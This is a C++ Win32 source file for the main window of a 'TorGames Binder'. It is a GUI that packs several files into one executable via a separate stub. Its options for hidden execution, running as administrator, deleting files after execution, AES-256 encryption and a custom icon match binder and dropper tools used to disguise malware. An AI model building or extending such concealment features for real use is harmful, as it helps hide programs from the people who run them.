// TorGames.Binder - Main window implementation
#include "MainWindow.h"
#include "../core/common.h"
#include "../utils/utils.h"
#include "../../res/resource.h"
#include <algorithm>

// Dialog resource IDs
#define IDD_FILE_SETTINGS       2001
#define IDD_GLOBAL_SETTINGS     2002

#define IDC_CHK_EXECUTE         2101
#define IDC_CHK_WAITFOREXIT     2102
#define IDC_CHK_RUNHIDDEN       2103
#define IDC_CHK_RUNASADMIN      2104
#define IDC_CHK_DELETEAFTER     2105
#define IDC_EDIT_EXTRACTPATH    2106
#define IDC_EDIT_CMDARGS        2107
#define IDC_EDIT_DELAY          2108
#define IDC_EDIT_ORDER          2109
#define IDC_BTN_BROWSE_PATH     2110

#define IDC_CHK_REQUIREADMIN    2201
#define IDC_EDIT_ICON           2202
#define IDC_BTN_BROWSE_ICON     2203

// Thread-local storage for dialog data
static thread_local BoundFileConfig* g_editingFile = nullptr;
static thread_local BinderConfig* g_editingConfig = nullptr;

MainWindow::MainWindow()
    : m_hwnd(NULL), m_listView(NULL), m_statusBar(NULL),
      m_hInstance(NULL), m_imageList(NULL) {
    // Enable encryption and compression by default
    m_config.compressionType = COMPRESSION_LZ4;
    m_config.encryptionType = ENCRYPTION_AES256;
}

MainWindow::~MainWindow() {
    if (m_imageList) {
        ImageList_Destroy(m_imageList);
    }
}

bool MainWindow::Create(HINSTANCE hInstance) {
    m_hInstance = hInstance;

    // Initialize common controls
    INITCOMMONCONTROLSEX icc = { sizeof(icc), ICC_LISTVIEW_CLASSES | ICC_BAR_CLASSES };
    InitCommonControlsEx(&icc);

    // Register window class
    WNDCLASSEXA wc = { sizeof(wc) };
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = "TorGamesBinderClass";
    wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

    if (!RegisterClassExA(&wc)) {
        return false;
    }

    // Create main window
    m_hwnd = CreateWindowExA(
        0,
        "TorGamesBinderClass",
        "TorGames Binder",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        800, 600,
        NULL, NULL, hInstance, this
    );

    if (!m_hwnd) {
        return false;
    }

    ShowWindow(m_hwnd, SW_SHOW);
    UpdateWindow(m_hwnd);

    return true;
}

int MainWindow::Run() {
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return (int)msg.wParam;
}

LRESULT CALLBACK MainWindow::WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    MainWindow* pThis = nullptr;

    if (msg == WM_NCCREATE) {
        CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
        pThis = (MainWindow*)pCreate->lpCreateParams;
        SetWindowLongPtr(hwnd, GWLP_USERDATA, (LONG_PTR)pThis);
        pThis->m_hwnd = hwnd;
    } else {
        pThis = (MainWindow*)GetWindowLongPtr(hwnd, GWLP_USERDATA);
    }

    if (pThis) {
        return pThis->HandleMessage(msg, wParam, lParam);
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

LRESULT MainWindow::HandleMessage(UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE:
            CreateControls();
            return 0;

        case WM_SIZE: {
            RECT rc;
            GetClientRect(m_hwnd, &rc);
            int statusHeight = 24;

            // Resize status bar
            SendMessage(m_statusBar, WM_SIZE, 0, 0);

            // Resize list view
            MoveWindow(m_listView, 0, 50, rc.right, rc.bottom - 50 - statusHeight, TRUE);
            return 0;
        }

        case WM_COMMAND:
            switch (LOWORD(wParam)) {
                case ID_BTN_ADD:
                    OnAddFile();
                    break;
                case ID_BTN_REMOVE:
                    OnRemoveFile();
                    break;
                case ID_BTN_MOVEUP:
                    OnMoveUp();
                    break;
                case ID_BTN_MOVEDOWN:
                    OnMoveDown();
                    break;
                case ID_BTN_SETTINGS:
                    OnFileSettings();
                    break;
                case ID_BTN_GLOBAL:
                    OnGlobalSettings();
                    break;
                case ID_BTN_BUILD:
                    OnBuild();
                    break;
            }
            return 0;

        case WM_NOTIFY: {
            NMHDR* pnmh = (NMHDR*)lParam;
            if (pnmh->idFrom == ID_LISTVIEW) {
                if (pnmh->code == NM_DBLCLK) {
                    OnFileSettings();
                } else if (pnmh->code == LVN_ITEMCHANGED) {
                    UpdateStatusBar();
                }
            }
            return 0;
        }

        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(m_hwnd, msg, wParam, lParam);
}

void MainWindow::CreateControls() {
    CreateToolbar();
    CreateListView();
    CreateStatusBar();
    UpdateStatusBar();
}

void MainWindow::CreateToolbar() {
    // Create a simple button bar using standard buttons
    int x = 5;
    int y = 8;
    int btnHeight = 28;
    int spacing = 5;

    // Add File button
    CreateWindowExA(0, "BUTTON", "Add File", WS_CHILD | WS_VISIBLE,
        x, y, 70, btnHeight, m_hwnd, (HMENU)ID_BTN_ADD, m_hInstance, NULL);
    x += 70 + spacing;

    // Remove button
    CreateWindowExA(0, "BUTTON", "Remove", WS_CHILD | WS_VISIBLE,
        x, y, 70, btnHeight, m_hwnd, (HMENU)ID_BTN_REMOVE, m_hInstance, NULL);
    x += 70 + spacing + 10;  // Extra spacing

    // Move Up button
    CreateWindowExA(0, "BUTTON", "Move Up", WS_CHILD | WS_VISIBLE,
        x, y, 70, btnHeight, m_hwnd, (HMENU)ID_BTN_MOVEUP, m_hInstance, NULL);
    x += 70 + spacing;

    // Move Down button
    CreateWindowExA(0, "BUTTON", "Move Down", WS_CHILD | WS_VISIBLE,
        x, y, 80, btnHeight, m_hwnd, (HMENU)ID_BTN_MOVEDOWN, m_hInstance, NULL);
    x += 80 + spacing + 10;  // Extra spacing

    // File Settings button
    CreateWindowExA(0, "BUTTON", "File Settings", WS_CHILD | WS_VISIBLE,
        x, y, 90, btnHeight, m_hwnd, (HMENU)ID_BTN_SETTINGS, m_hInstance, NULL);
    x += 90 + spacing;

    // Global Settings button
    CreateWindowExA(0, "BUTTON", "Global Settings", WS_CHILD | WS_VISIBLE,
        x, y, 100, btnHeight, m_hwnd, (HMENU)ID_BTN_GLOBAL, m_hInstance, NULL);
    x += 100 + spacing + 10;  // Extra spacing

    // Build button
    CreateWindowExA(0, "BUTTON", "Build EXE", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
        x, y, 80, btnHeight, m_hwnd, (HMENU)ID_BTN_BUILD, m_hInstance, NULL);
}

void MainWindow::CreateListView() {
    RECT rc;
    GetClientRect(m_hwnd, &rc);

    m_listView = CreateWindowExA(
        WS_EX_CLIENTEDGE,
        WC_LISTVIEWA,
        NULL,
        WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SINGLESEL | LVS_SHOWSELALWAYS,
        0, 50, rc.right, rc.bottom - 74,
        m_hwnd,
        (HMENU)ID_LISTVIEW,
        m_hInstance,
        NULL
    );

    ListView_SetExtendedListViewStyle(m_listView, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);

    // Add columns
    LVCOLUMNA lvc = {};
    lvc.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;

    lvc.iSubItem = 0;
    lvc.pszText = (LPSTR)"#";
    lvc.cx = 40;
    ListView_InsertColumn(m_listView, 0, &lvc);

    lvc.iSubItem = 1;
    lvc.pszText = (LPSTR)"Filename";
    lvc.cx = 200;
    ListView_InsertColumn(m_listView, 1, &lvc);

    lvc.iSubItem = 2;
    lvc.pszText = (LPSTR)"Size";
    lvc.cx = 80;
    ListView_InsertColumn(m_listView, 2, &lvc);

    lvc.iSubItem = 3;
    lvc.pszText = (LPSTR)"Execute";
    lvc.cx = 60;
    ListView_InsertColumn(m_listView, 3, &lvc);

    lvc.iSubItem = 4;
    lvc.pszText = (LPSTR)"Admin";
    lvc.cx = 60;
    ListView_InsertColumn(m_listView, 4, &lvc);

    lvc.iSubItem = 5;
    lvc.pszText = (LPSTR)"Hidden";
    lvc.cx = 60;
    ListView_InsertColumn(m_listView, 5, &lvc);

    lvc.iSubItem = 6;
    lvc.pszText = (LPSTR)"Wait";
    lvc.cx = 60;
    ListView_InsertColumn(m_listView, 6, &lvc);

    lvc.iSubItem = 7;
    lvc.pszText = (LPSTR)"Full Path";
    lvc.cx = 300;
    ListView_InsertColumn(m_listView, 7, &lvc);
}

void MainWindow::CreateStatusBar() {
    m_statusBar = CreateWindowExA(
        0,
        STATUSCLASSNAMEA,
        NULL,
        WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP,
        0, 0, 0, 0,
        m_hwnd,
        (HMENU)ID_STATUSBAR,
        m_hInstance,
        NULL
    );
}

void MainWindow::RefreshListView() {
    ListView_DeleteAllItems(m_listView);

    for (const auto& file : m_config.files) {
        AddFileToList(file);
    }
}

void MainWindow::AddFileToList(const BoundFileConfig& file) {
    int index = ListView_GetItemCount(m_listView);

    LVITEMA lvi = {};
    lvi.mask = LVIF_TEXT;
    lvi.iItem = index;

    // Order number
    char orderStr[16];
    snprintf(orderStr, sizeof(orderStr), "%d", file.executionOrder);
    lvi.iSubItem = 0;
    lvi.pszText = orderStr;
    ListView_InsertItem(m_listView, &lvi);

    // Filename
    ListView_SetItemText(m_listView, index, 1, (LPSTR)file.filename.c_str());

    // Size
    char sizeStr[32];
    if (file.fileSize >= 1024 * 1024) {
        snprintf(sizeStr, sizeof(sizeStr), "%.1f MB", file.fileSize / (1024.0 * 1024.0));
    } else if (file.fileSize >= 1024) {
        snprintf(sizeStr, sizeof(sizeStr), "%.1f KB", file.fileSize / 1024.0);
    } else {
        snprintf(sizeStr, sizeof(sizeStr), "%lu B", file.fileSize);
    }
    ListView_SetItemText(m_listView, index, 2, sizeStr);

    // Execute
    ListView_SetItemText(m_listView, index, 3, (LPSTR)(file.executeFile ? "Yes" : "No"));

    // Admin
    ListView_SetItemText(m_listView, index, 4, (LPSTR)(file.runAsAdmin ? "Yes" : "No"));

    // Hidden
    ListView_SetItemText(m_listView, index, 5, (LPSTR)(file.runHidden ? "Yes" : "No"));

    // Wait
    ListView_SetItemText(m_listView, index, 6, (LPSTR)(file.waitForExit ? "Yes" : "No"));

    // Full path
    ListView_SetItemText(m_listView, index, 7, (LPSTR)file.fullPath.c_str());
}

int MainWindow::GetSelectedIndex() {
    return ListView_GetNextItem(m_listView, -1, LVNI_SELECTED);
}

void MainWindow::UpdateStatusBar() {
    char status[256];
    int count = (int)m_config.files.size();
    DWORD totalSize = 0;
    for (const auto& f : m_config.files) {
        totalSize += f.fileSize;
    }

    if (totalSize >= 1024 * 1024) {
        snprintf(status, sizeof(status), "%d file(s) | Total: %.1f MB", count, totalSize / (1024.0 * 1024.0));
    } else if (totalSize >= 1024) {
        snprintf(status, sizeof(status), "%d file(s) | Total: %.1f KB", count, totalSize / 1024.0);
    } else {
        snprintf(status, sizeof(status), "%d file(s) | Total: %lu bytes", count, totalSize);
    }

    SendMessageA(m_statusBar, SB_SETTEXTA, 0, (LPARAM)status);
}

void MainWindow::OnAddFile() {
    std::string path = Utils::BrowseForFile(m_hwnd,
        "All Files (*.*)\0*.*\0Executables (*.exe)\0*.exe\0",
        "Select file to bind");

    if (path.empty()) return;

    BoundFileConfig file;
    file.fullPath = path;
    file.filename = Utils::GetFileName(path);
    file.fileSize = Utils::GetFileSize(path.c_str());
    file.executionOrder = (int)m_config.files.size() + 1;

    // Auto-detect if it's an executable
    std::string ext = Utils::GetFileExtension(path);
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
    file.executeFile = (ext == ".exe" || ext == ".bat" || ext == ".cmd" || ext == ".msi");

    m_config.files.push_back(file);
    AddFileToList(file);
    UpdateStatusBar();
}

void MainWindow::OnRemoveFile() {
    int sel = GetSelectedIndex();
    if (sel < 0 || sel >= (int)m_config.files.size()) return;

    m_config.files.erase(m_config.files.begin() + sel);

    // Re-number remaining files
    for (size_t i = 0; i < m_config.files.size(); i++) {
        m_config.files[i].executionOrder = (int)i + 1;
    }

    RefreshListView();
    UpdateStatusBar();
}

void MainWindow::OnMoveUp() {
    int sel = GetSelectedIndex();
    if (sel <= 0 || sel >= (int)m_config.files.size()) return;

    std::swap(m_config.files[sel], m_config.files[sel - 1]);
    std::swap(m_config.files[sel].executionOrder, m_config.files[sel - 1].executionOrder);

    RefreshListView();
    ListView_SetItemState(m_listView, sel - 1, LVIS_SELECTED | LVIS_FOCUSED, LVIS_SELECTED | LVIS_FOCUSED);
}

void MainWindow::OnMoveDown() {
    int sel = GetSelectedIndex();
    if (sel < 0 || sel >= (int)m_config.files.size() - 1) return;

    std::swap(m_config.files[sel], m_config.files[sel + 1]);
    std::swap(m_config.files[sel].executionOrder, m_config.files[sel + 1].executionOrder);

    RefreshListView();
    ListView_SetItemState(m_listView, sel + 1, LVIS_SELECTED | LVIS_FOCUSED, LVIS_SELECTED | LVIS_FOCUSED);
}

void MainWindow::OnFileSettings() {
    int sel = GetSelectedIndex();
    if (sel < 0 || sel >= (int)m_config.files.size()) {
        MessageBoxA(m_hwnd, "Please select a file first.", "File Settings", MB_OK | MB_ICONINFORMATION);
        return;
    }

    g_editingFile = &m_config.files[sel];

    // Create dialog dynamically
    DLGTEMPLATE dlg = {};
    dlg.style = DS_MODALFRAME | DS_CENTER | WS_POPUP | WS_CAPTION | WS_SYSMENU;
    dlg.dwExtendedStyle = 0;
    dlg.cdit = 0;
    dlg.cx = 200;
    dlg.cy = 180;

    INT_PTR result = DialogBoxIndirectParamA(m_hInstance, &dlg, m_hwnd, FileSettingsDlgProc, (LPARAM)g_editingFile);

    if (result == IDOK) {
        RefreshListView();
        ListView_SetItemState(m_listView, sel, LVIS_SELECTED | LVIS_FOCUSED, LVIS_SELECTED | LVIS_FOCUSED);
    }
}

INT_PTR CALLBACK MainWindow::FileSettingsDlgProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static BoundFileConfig* pFile = nullptr;

    switch (msg) {
        case WM_INITDIALOG: {
            pFile = (BoundFileConfig*)lParam;
            SetWindowTextA(hwnd, "File Settings");

            // Resize dialog
            SetWindowPos(hwnd, NULL, 0, 0, 400, 380, SWP_NOMOVE | SWP_NOZORDER);
            RECT rc;
            GetClientRect(hwnd, &rc);

            int y = 10;
            int labelWidth = 100;
            int controlX = 110;
            int controlWidth = 260;

            // Execution Order
            CreateWindowExA(0, "STATIC", "Execution Order:", WS_CHILD | WS_VISIBLE,
                10, y + 2, labelWidth, 20, hwnd, NULL, NULL, NULL);
            HWND hOrder = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_NUMBER,
                controlX, y, 60, 22, hwnd, (HMENU)IDC_EDIT_ORDER, NULL, NULL);
            char orderStr[16];
            snprintf(orderStr, sizeof(orderStr), "%d", pFile->executionOrder);
            SetWindowTextA(hOrder, orderStr);
            y += 30;

            // Checkboxes
            HWND hExecute = CreateWindowExA(0, "BUTTON", "Execute this file", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX,
                10, y, 180, 20, hwnd, (HMENU)IDC_CHK_EXECUTE, NULL, NULL);
            SendMessage(hExecute, BM_SETCHECK, pFile->executeFile ? BST_CHECKED : BST_UNCHECKED, 0);
            y += 24;

            HWND hWait = CreateWindowExA(0, "BUTTON", "Wait for exit before continuing", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX,
                10, y, 220, 20, hwnd, (HMENU)IDC_CHK_WAITFOREXIT, NULL, NULL);
            SendMessage(hWait, BM_SETCHECK, pFile->waitForExit ? BST_CHECKED : BST_UNCHECKED, 0);
            y += 24;

            HWND hHidden = CreateWindowExA(0, "BUTTON", "Run hidden (no window)", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX,
                10, y, 180, 20, hwnd, (HMENU)IDC_CHK_RUNHIDDEN, NULL, NULL);
            SendMessage(hHidden, BM_SETCHECK, pFile->runHidden ? BST_CHECKED : BST_UNCHECKED, 0);
            y += 24;

            HWND hAdmin = CreateWindowExA(0, "BUTTON", "Run as Administrator", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX,
                10, y, 180, 20, hwnd, (HMENU)IDC_CHK_RUNASADMIN, NULL, NULL);
            SendMessage(hAdmin, BM_SETCHECK, pFile->runAsAdmin ? BST_CHECKED : BST_UNCHECKED, 0);
            y += 24;

            HWND hDelete = CreateWindowExA(0, "BUTTON", "Delete after execution", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX,
                10, y, 180, 20, hwnd, (HMENU)IDC_CHK_DELETEAFTER, NULL, NULL);
            SendMessage(hDelete, BM_SETCHECK, pFile->deleteAfterExecution ? BST_CHECKED : BST_UNCHECKED, 0);
            y += 30;

            // Extract Path
            CreateWindowExA(0, "STATIC", "Extract to:", WS_CHILD | WS_VISIBLE,
                10, y + 2, labelWidth, 20, hwnd, NULL, NULL, NULL);
            HWND hPath = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", pFile->extractPath.c_str(), WS_CHILD | WS_VISIBLE,
                controlX, y, controlWidth - 30, 22, hwnd, (HMENU)IDC_EDIT_EXTRACTPATH, NULL, NULL);
            CreateWindowExA(0, "BUTTON", "...", WS_CHILD | WS_VISIBLE,
                controlX + controlWidth - 25, y, 25, 22, hwnd, (HMENU)IDC_BTN_BROWSE_PATH, NULL, NULL);
            y += 30;

            // Command Line Args
            CreateWindowExA(0, "STATIC", "Arguments:", WS_CHILD | WS_VISIBLE,
                10, y + 2, labelWidth, 20, hwnd, NULL, NULL, NULL);
            HWND hArgs = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", pFile->commandLineArgs.c_str(), WS_CHILD | WS_VISIBLE,
                controlX, y, controlWidth, 22, hwnd, (HMENU)IDC_EDIT_CMDARGS, NULL, NULL);
            y += 30;

            // Execution Delay
            CreateWindowExA(0, "STATIC", "Delay (ms):", WS_CHILD | WS_VISIBLE,
                10, y + 2, labelWidth, 20, hwnd, NULL, NULL, NULL);
            HWND hDelay = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_NUMBER,
                controlX, y, 80, 22, hwnd, (HMENU)IDC_EDIT_DELAY, NULL, NULL);
            char delayStr[16];
            snprintf(delayStr, sizeof(delayStr), "%d", pFile->executionDelay);
            SetWindowTextA(hDelay, delayStr);
            y += 40;

            // OK/Cancel buttons
            CreateWindowExA(0, "BUTTON", "OK", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
                200, y, 80, 28, hwnd, (HMENU)IDOK, NULL, NULL);
            CreateWindowExA(0, "BUTTON", "Cancel", WS_CHILD | WS_VISIBLE,
                290, y, 80, 28, hwnd, (HMENU)IDCANCEL, NULL, NULL);

            return TRUE;
        }

        case WM_COMMAND:
            switch (LOWORD(wParam)) {
                case IDC_BTN_BROWSE_PATH: {
                    std::string path = Utils::BrowseForFolder(hwnd, "Select extraction folder");
                    if (!path.empty()) {
                        SetDlgItemTextA(hwnd, IDC_EDIT_EXTRACTPATH, path.c_str());
                    }
                    return TRUE;
                }

                case IDOK: {
                    // Save values
                    char buf[MAX_PATH];

                    GetDlgItemTextA(hwnd, IDC_EDIT_ORDER, buf, sizeof(buf));
                    pFile->executionOrder = atoi(buf);

                    pFile->executeFile = (SendDlgItemMessage(hwnd, IDC_CHK_EXECUTE, BM_GETCHECK, 0, 0) == BST_CHECKED);
                    pFile->waitForExit = (SendDlgItemMessage(hwnd, IDC_CHK_WAITFOREXIT, BM_GETCHECK, 0, 0) == BST_CHECKED);
                    pFile->runHidden = (SendDlgItemMessage(hwnd, IDC_CHK_RUNHIDDEN, BM_GETCHECK, 0, 0) == BST_CHECKED);
                    pFile->runAsAdmin = (SendDlgItemMessage(hwnd, IDC_CHK_RUNASADMIN, BM_GETCHECK, 0, 0) == BST_CHECKED);
                    pFile->deleteAfterExecution = (SendDlgItemMessage(hwnd, IDC_CHK_DELETEAFTER, BM_GETCHECK, 0, 0) == BST_CHECKED);

                    GetDlgItemTextA(hwnd, IDC_EDIT_EXTRACTPATH, buf, sizeof(buf));
                    pFile->extractPath = buf;

                    GetDlgItemTextA(hwnd, IDC_EDIT_CMDARGS, buf, sizeof(buf));
                    pFile->commandLineArgs = buf;

                    GetDlgItemTextA(hwnd, IDC_EDIT_DELAY, buf, sizeof(buf));
                    pFile->executionDelay = atoi(buf);

                    EndDialog(hwnd, IDOK);
                    return TRUE;
                }

                case IDCANCEL:
                    EndDialog(hwnd, IDCANCEL);
                    return TRUE;
            }
            break;

        case WM_CLOSE:
            EndDialog(hwnd, IDCANCEL);
            return TRUE;
    }
    return FALSE;
}

void MainWindow::OnGlobalSettings() {
    g_editingConfig = &m_config;

    DLGTEMPLATE dlg = {};
    dlg.style = DS_MODALFRAME | DS_CENTER | WS_POPUP | WS_CAPTION | WS_SYSMENU;
    dlg.dwExtendedStyle = 0;
    dlg.cdit = 0;
    dlg.cx = 200;
    dlg.cy = 100;

    DialogBoxIndirectParamA(m_hInstance, &dlg, m_hwnd, GlobalSettingsDlgProc, (LPARAM)g_editingConfig);
}

INT_PTR CALLBACK MainWindow::GlobalSettingsDlgProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static BinderConfig* pConfig = nullptr;

    switch (msg) {
        case WM_INITDIALOG: {
            pConfig = (BinderConfig*)lParam;
            SetWindowTextA(hwnd, "Global Settings");

            SetWindowPos(hwnd, NULL, 0, 0, 400, 250, SWP_NOMOVE | SWP_NOZORDER);

            int y = 10;

            // Require Admin checkbox
            HWND hAdmin = CreateWindowExA(0, "BUTTON", "Require Administrator privileges", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX,
                10, y, 250, 20, hwnd, (HMENU)IDC_CHK_REQUIREADMIN, NULL, NULL);
            SendMessage(hAdmin, BM_SETCHECK, pConfig->requireAdmin ? BST_CHECKED : BST_UNCHECKED, 0);
            y += 28;

            // Encryption checkbox
            HWND hEncrypt = CreateWindowExA(0, "BUTTON", "Enable Encryption (AES-256-GCM)", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX,
                10, y, 250, 20, hwnd, (HMENU)IDC_ENCRYPT_CHECK, NULL, NULL);
            SendMessage(hEncrypt, BM_SETCHECK, pConfig->encryptionType == ENCRYPTION_AES256 ? BST_CHECKED : BST_UNCHECKED, 0);
            y += 28;

            // Compression checkbox
            HWND hCompress = CreateWindowExA(0, "BUTTON", "Enable Compression (LZ4)", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX,
                10, y, 250, 20, hwnd, (HMENU)IDC_COMPRESS_CHECK, NULL, NULL);
            SendMessage(hCompress, BM_SETCHECK, pConfig->compressionType == COMPRESSION_LZ4 ? BST_CHECKED : BST_UNCHECKED, 0);
            y += 35;

            // Custom Icon
            CreateWindowExA(0, "STATIC", "Custom Icon:", WS_CHILD | WS_VISIBLE,
                10, y + 2, 80, 20, hwnd, NULL, NULL, NULL);
            HWND hIcon = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", pConfig->customIcon.c_str(), WS_CHILD | WS_VISIBLE,
                95, y, 230, 22, hwnd, (HMENU)IDC_EDIT_ICON, NULL, NULL);
            CreateWindowExA(0, "BUTTON", "...", WS_CHILD | WS_VISIBLE,
                330, y, 30, 22, hwnd, (HMENU)IDC_BTN_BROWSE_ICON, NULL, NULL);
            y += 50;

            // OK/Cancel buttons
            CreateWindowExA(0, "BUTTON", "OK", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
                200, y, 80, 28, hwnd, (HMENU)IDOK, NULL, NULL);
            CreateWindowExA(0, "BUTTON", "Cancel", WS_CHILD | WS_VISIBLE,
                290, y, 80, 28, hwnd, (HMENU)IDCANCEL, NULL, NULL);

            return TRUE;
        }

        case WM_COMMAND:
            switch (LOWORD(wParam)) {
                case IDC_BTN_BROWSE_ICON: {
                    std::string path = Utils::BrowseForFile(hwnd,
                        "Icon Files (*.ico)\0*.ico\0All Files (*.*)\0*.*\0",
                        "Select custom icon");
                    if (!path.empty()) {
                        SetDlgItemTextA(hwnd, IDC_EDIT_ICON, path.c_str());
                    }
                    return TRUE;
                }

                case IDOK: {
                    pConfig->requireAdmin = (SendDlgItemMessage(hwnd, IDC_CHK_REQUIREADMIN, BM_GETCHECK, 0, 0) == BST_CHECKED);

                    // Encryption setting
                    pConfig->encryptionType = (SendDlgItemMessage(hwnd, IDC_ENCRYPT_CHECK, BM_GETCHECK, 0, 0) == BST_CHECKED)
                        ? ENCRYPTION_AES256 : ENCRYPTION_NONE;

                    // Compression setting
                    pConfig->compressionType = (SendDlgItemMessage(hwnd, IDC_COMPRESS_CHECK, BM_GETCHECK, 0, 0) == BST_CHECKED)
                        ? COMPRESSION_LZ4 : COMPRESSION_NONE;

                    char buf[MAX_PATH];
                    GetDlgItemTextA(hwnd, IDC_EDIT_ICON, buf, sizeof(buf));
                    pConfig->customIcon = buf;

                    EndDialog(hwnd, IDOK);
                    return TRUE;
                }

                case IDCANCEL:
                    EndDialog(hwnd, IDCANCEL);
                    return TRUE;
            }
            break;

        case WM_CLOSE:
            EndDialog(hwnd, IDCANCEL);
            return TRUE;
    }
    return FALSE;
}

void MainWindow::OnBuild() {
    if (m_config.files.empty()) {
        MessageBoxA(m_hwnd, "Please add at least one file to bind.", "Build Error", MB_OK | MB_ICONWARNING);
        return;
    }

    // Check if stub exists
    std::string stubPath = m_builder.GetStubPath();
    if (!Utils::FileExists(stubPath.c_str())) {
        MessageBoxA(m_hwnd,
            ("Stub executable not found:\n" + stubPath + "\n\nMake sure TorGames.Binder.Stub.exe is in the same folder.").c_str(),
            "Build Error", MB_OK | MB_ICONERROR);
        return;
    }

    std::string outputPath = Utils::SaveFileDialog(m_hwnd,
        "Executable Files (*.exe)\0*.exe\0",
        "exe",
        "Save bound executable as");

    if (outputPath.empty()) return;

    m_builder.SetConfig(m_config);

    if (m_builder.Build(outputPath)) {
        MessageBoxA(m_hwnd,
            ("Build successful!\n\nOutput: " + outputPath).c_str(),
            "Build Complete", MB_OK | MB_ICONINFORMATION);
    } else {
        MessageBoxA(m_hwnd,
            ("Build failed:\n\n" + m_builder.GetLastError()).c_str(),
            "Build Error", MB_OK | MB_ICONERROR);
    }
}
